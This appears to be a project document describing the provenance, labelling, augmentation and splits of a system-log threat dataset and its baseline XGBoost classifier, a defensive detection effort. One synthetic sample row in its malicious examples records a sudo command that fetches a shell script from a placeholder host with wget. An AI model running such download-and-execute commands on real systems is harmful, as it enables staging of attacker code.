# Log Threat Dataset — Provenance & Normalization (LOG-ML-P1)

Status: dataset acquisition + label audit done (P1); **baseline model v1 trained (LOG-ML-P2)** — see §8. Inference wiring into the analyzer contract is a later phase.

## 8. Baseline model v1 (LOG-ML-P2)

Artifacts: `backend/models/log_threat_v1.pkl` (joblib bundle: XGBoost + TF-IDF vectorizer + numeric feature list) and `backend/models/log_threat_v1_features.json` (manifest: metrics, vectorizer params, split config, CSV SHA256).

- Code: features `backend/app/services/log_features.py` (single implementation shared by training + future serving), heuristic layer `backend/app/services/log_heuristic.py`, monotonic blend `backend/app/services/log_blend.py` (ML may raise, never lower, strong heuristics), training script `scripts/train_log_model_v1.py`.
- Split: group-aware 80/10/10 on `split_key` (train 91,916 / val 10,857 / test 11,666 rows), benign subsampled to 3× threats in train only (26,300 rows).
- Metrics (test set): accuracy 0.9703, **macro-F1 0.7671** (baseline target >0.7 met). Per-class F1: benign 0.985, suspicious 0.912, malicious 0.404.
- Known limitation: malicious recall 0.316 is dominated by HDFS anomaly blocks whose EventTemplates also occur in benign blocks — line-level content alone cannot fully separate them; block/trace context features are the v2 lever. Eval harness on 10 curated samples: 6/10 exact severity (the 4 misses are contract raises — ML lifts heuristic medium→critical at p>0.95 — and the blend's info→low output floor, per the LOG-ML-P2 contract).

Raw data lives in `data/datasets/log_threat/raw/` (**gitignored** — not committed). The unified CSV and the label audit are derived artifacts (`log_threat_unified.csv`, `label_audit.json`, also gitignored). The committed artifacts are this doc, `data/datasets/log_threat/normalize.py`, and `data/datasets/log_threat/provenance.json` (machine-readable provenance, same content as below).

## 1. Sources

All raw files fetched **2026-09-27**. SHA256 values are of the raw files as downloaded; the authoritative copy is `provenance.json`.

| # | Source | URL | License | SHA256 (raw artifact) | Rows contributed | Native labels |
|---|--------|-----|---------|----------------------|------------------|---------------|
| 1 | Loghub HDFS v1 (100k structured slice + block ground truth) | https://raw.githubusercontent.com/logpai/loglizer/master/data/HDFS/HDFS_100k.log_structured.csv and `.../anomaly_label.csv` (loghub dataset; canonical SOSP'09 labels) | Loghub: "freely available for research or academic work" + citation (loghub repo has no SPDX license; hosted under logpai/loglizer, MIT) | `0b18e7d3e0bd991d3fc5d1c8b6a2a172fa268fd533d93a06c8ffe90130f4f213` (structured), `78de297d3862e37295951484028c1749bee4e3f06c2d563242c9d1999ff1abb0` (labels) | 104,815 lines (7,940 blocks) | `Normal` / `Anomaly` per **block** (`anomaly_label.csv`, 575,061 blocks) |
| 2 | Loghub BGL 2k (BlueGene/L supercomputer) | https://raw.githubusercontent.com/logpai/loghub/master/BGL/BGL_2k.log_structured.csv | Loghub research/academic + citation (as above) | `3fe74103c0b02a28514534e2a47257a3f770135ca61afd425bbd3b9d6a31fe26` (structured), `2a819ea540909db682005c9cf948387a40729b5c2e9f19d430e29ce704825496` (raw log) | 2,000 lines | per-line `Label`: `-` (normal) or RAS alert code (`KERNDTLB`, `APPSEV`, …) — 143 alert lines |
| 3 | Loghub OpenSSH 2k (LabSZ honeypot-exposed SSH server) | https://raw.githubusercontent.com/logpai/loghub/master/OpenSSH/OpenSSH_2k.log_structured.csv | Loghub research/academic + citation (as above) | `c0996a11545f4b94b435993760afa441a9e373f7bfc9e787afdb8e62f65acb4f` (structured), `1e4912727fa88245113d41b16a0cd25ceadba7f931e1c406542885b91254264f` (raw log) | 2,000 lines | none native — derived (see §2) |
| 4 | Loghub Linux 2k (Debian syslog) | https://raw.githubusercontent.com/logpai/loghub/master/Linux/Linux_2k.log_structured.csv | Loghub research/academic + citation (as above) | `7c86d7b0ecb961a25f00d9475a154df97613b9974f31ce142a146caa2017c71e` (structured), `b3e20bc1afe732ab1bf3ed1de4bf9c809e4194e02f7dea911d918e5342e8e173` (raw log) | 2,000 lines | none native — derived (see §2) |
| 5 | ADFA-LD (UNSW host-IDS syscall traces; verazuo labeled mirror) | https://github.com/verazuo/a-labelled-version-of-the-ADFA-LD-dataset (`ADFA-LD.zip`) | ADFA-LD: released by UNSW (Creech & Hu) for **research use with citation**; mirror adds no terms. Required citations: Creech & Hu, IEEE Trans. Computers 2013; Creech & Hu, WCNC 2013; Creech thesis 2014 | `58d625470749344843a7f730b0875ce9b8769f6fa48f18dc4a92bd07c342ead5` (zip) | 833 benign + 746 malicious traces | `Training_Data_Master/UTD-*` = normal; `Attack_Data_Master/<Family>_N/<trace>.txt` = attack (families: Adduser, Hydra_FTP, Hydra_SSH, Java_Meterpreter, Meterpreter, Web_Shell). `Validation_Data_Master` skipped (unlabeled) |
| 6 | Synthetic augmentation (MITRE playbooks) | generated in-repo by `normalize.py` (seed **1337**) | n/a (our own generation) | n/a | 1,545 lines | `synthetic:<MITRE id>` |

Loghub citation: Zhu, He, He, Liu, Lyu. *Loghub: A Large Collection of System Log Datasets for AI-driven Log Analytics*, ISSRE 2023. HDFS labels citation: Xu, Huang, Fox, Patterson, Jordan. *Detecting Large-Scale System Problems by Mining Console Logs*, SOSP 2009.

## 2. Normalization rules

Script: `data/datasets/log_threat/normalize.py` (deterministic; re-runnable). Output schema:

```
raw_line, template_id, source, label, mitre, timestamp, split_key, origin, native_label
```

`label ∈ {benign, suspicious, malicious}`; `origin ∈ {genuine, synthetic-aug}`; `native_label` keeps the source's own vocabulary verbatim.

| Source | benign | suspicious | malicious | Notes |
|--------|--------|-----------|-----------|-------|
| loghub_hdfs | `Normal` blocks | — | `Anomaly` blocks | SOSP'09 handcrafted-rule ground truth joined on `BlockId` (104,815/104,815 lines matched, 0 unmatched). Anomaly = known-bad block activity → malicious class |
| loghub_bgl | `Label == "-"` | RAS alert code | — | BGL alerts are machine faults of unconfirmed cause → suspicious, **not** malicious (no MITRE tag) |
| loghub_openssh | all other lines | `Failed password` / `authentication failure` → T1110; `POSSIBLE BREAK-IN ATTEMPT` / `invalid user` → T1110 | — | genuine brute-force evidence on a real internet-exposed SSH host |
| loghub_linux | all other lines | `authentication failure` / `failed password` → T1110 | — | same derivation as OpenSSH |
| adfa_ld | `UTD-*` traces | — | all attack traces | MITRE mapped conservatively: `Hydra_SSH`, `Hydra_FTP` → T1110; other families unmapped (`mitre=""`) |
| synthetic_aug | — | pattern-dependent | pattern-dependent | see §3 |

Leakage-relevant honesty note: HDFS `Anomaly` and BGL alert labels mark **operational anomalies** (failures/faults), not attacker activity in every case; ADFA-LD attacks are genuine attacker technique traces. The class semantics ("malicious" = confirmed-bad behaviour class) are as defined above and must be restated in any model card. An unlabeled-verification pass (LLM review of a sample) is deferred to the training phase.

## 3. Augmentation policy

Genuine data underrepresents three techniques, so `normalize.py` generates playbook rows tagged `origin=synthetic-aug`, `native_label=synthetic:<MITRE>`, source `synthetic_aug`, deterministic seed **1337**:

| Technique | Pattern generated | Label | Count |
|-----------|-------------------|-------|-------|
| T1110 Brute Force | sshd failure bursts (4–12 lines) from one source IP; every 5th burst ends in a successful login (takeover) | suspicious (+30 malicious successes) | 1,245 |
| T1078 Valid Accounts | successful logins from unusual source / off-hours; sudo→`wget` staging | suspicious (+50 malicious) | 150 |
| T1548 Abuse Elevation | sudo `incorrect password attempts` on unusual commands; `FAILED SU (to root)` | suspicious (+50 malicious) | 150 |

Genuine rows are never modified or relabeled by augmentation. Synthetic rows are excluded from any future headline metric unless reported separately.

## 4. Class distribution (final, combined 113,939 rows)

| Label | Count | Genuine | Synthetic |
|-------|-------|---------|-----------|
| benign | 106,402 | 106,402 | 0 |
| suspicious | 3,390 | 2,845 | 545 |
| malicious | 4,147 | 3,917 | 230 |
| **total** | **113,939** | **112,394** | **1,545** |

Per source: `loghub_hdfs` 101,544 benign / 3,271 malicious · `loghub_bgl` 1,857 benign / 143 suspicious · `loghub_openssh` 658 benign / 1,342 suspicious · `loghub_linux` 1,510 benign / 490 suspicious · `adfa_ld` 833 benign / 746 malicious · `synthetic_aug` 1,415 suspicious / 130 malicious.

Known imbalance (≈94% benign) is expected for system logs; the training phase will handle balancing (sub-sampling / class weights, mirroring the email-model pattern in `ML_MODELS.md`).

## 5. Sample rows (unified CSV)

**Benign**
```
[BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.71.68:50010 is added to blk_-8967128144662971115 size 67108864]  loghub_hdfs mitre=-
[generating core.37749]  loghub_bgl mitre=- (native `-`)
[connection from 206.47.209.10 () at Mon Jul 25 06:39:18 2005]  loghub_linux mitre=-
[PacketResponder 1 for block blk_38865049064139660 terminating]  loghub_hdfs mitre=-
[6 91 11 45 221 221 221 33 33 192 33 5 197 192 6 33 5 3 197 192 192 …]  adfa_ld (UTD normal trace) mitre=-
```

**Suspicious**
```
[Failed password for invalid user 123 from 183.62.140.253 port 49870 ssh2]  loghub_openssh T1110
[pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=183.62.140.253 user=root]  loghub_openssh T1110
[data TLB error interrupt]  loghub_bgl mitre=- (native `KERNDTLB` — RAS fault, unconfirmed cause)
[Mar 14 04:32:32 srv-auth01 sshd[2092]: Failed password for deploy from 10.0.2.5 port 40006 ssh2]  synthetic_aug T1110
[Mar 10 03:48:00 srv-auth01 sshd[3000]: Accepted publickey for deploy from 10.0.2.5 port 41000 ssh2: RSA SHA256:syn0]  synthetic_aug T1078
```

**Malicious**
```
[Receiving block blk_-2126554733521224025 src: /10.251.199.86:42666 dest: /10.251.199.86:50010]  loghub_hdfs (block labeled Anomaly)
[PacketResponder 1 for block blk_872694497849122755 terminating]  loghub_hdfs (block labeled Anomaly)
[78 240 78 168 168 3 78 168 168 3 168 168 78 3 3 …]  adfa_ld (Meterpreter attack trace)
[Mar 11 03:52:52 srv-auth01 sshd[2112]: Accepted password for root from 10.0.3.10 port 40000 ssh2]  synthetic_aug T1110
[Mar 10 03:48:30 srv-auth01 sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c wget http://10.0.3.3/x.sh]  synthetic_aug T1078
```

## 6. Split strategy (leakage control)

Split key is recorded per row in `split_key`; **any future train/val/test split must be grouped by `split_key`** (group-aware split, e.g. `GroupShuffleSplit`), never row-random:

| Source | Split key | Rationale |
|--------|-----------|-----------|
| loghub_hdfs | `hdfs:<BlockId>` | a block's lines form one trace; the same block must never straddle split boundaries (the classic HDFS leakage trap) |
| loghub_bgl | `bgl:<Node>` | same physical node stays on one side (the 2k slice has 1,778 nodes; 4 nodes carry both normal and alert lines — the key stays atomic, the *labels* within it are mixed by design) |
| loghub_openssh / loghub_linux | `openssh:<month-day>` / `linux:<month-day>` | calendar-window split; note OpenSSH_2k resolves to a single day window, so the whole source stays on one side of a chronological split |
| adfa_ld | `adfa:<family dir or UTD file>` | all trace variants of one attack family share a key, so no attack seen in train reappears in test |
| synthetic_aug | `synaug:<MITRE>:1337` | per-technique key; synthetic rows are group-held-out per technique and can also be dropped from test entirely |

No timestamps are cross-source comparable (HDFS 2008, BGL 2005, OpenSSH 2013, Linux 2005, ADFA n/a, synthetic none), so chronological splits are per-source only. `label_audit.json` records `unique_split_keys` / `multi_class_keys` per source for verification.

## 7. License compliance statement

- **Loghub datasets (HDFS/BGL/OpenSSH/Linux):** used for research/academic work per the loghub usage statement, with the loghub paper cited above and the repository URL referenced. The specific HDFS label file was fetched from logpai/loglizer (MIT-licensed repository).
- **ADFA-LD:** UNSW research dataset used with the three required citations (Creech & Hu 2013 ×2, Creech thesis 2014); obtained from the public verazuo mirror of the labeled version.
- **Synthetic augmentation:** generated in-repo; no external license constraints.
- Redistribution of raw datasets is **not** intended: raw data is gitignored and must be re-fetched via the URLs in §1 (SHA256 in `provenance.json` pins integrity).
